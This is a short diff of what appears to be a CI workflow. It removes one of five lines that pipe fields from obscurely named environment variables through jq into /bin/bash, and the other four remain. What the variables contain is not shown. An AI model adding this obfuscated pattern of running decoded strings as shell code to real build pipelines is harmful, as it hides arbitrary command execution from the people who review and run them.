@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$zludt0" | jq -r .zvkpp4224 | /bin/bash
           echo $h446 | jq -r .xw64 | /bin/bash
           echo $exa75516 | jq -r .qmz78 | /bin/bash
-          printf '%s' "$ul10601" | jq -r .lg70922 | /bin/bash
           echo $wjor295 | jq -r .d47 | /bin/bash
 
       - name: Save results
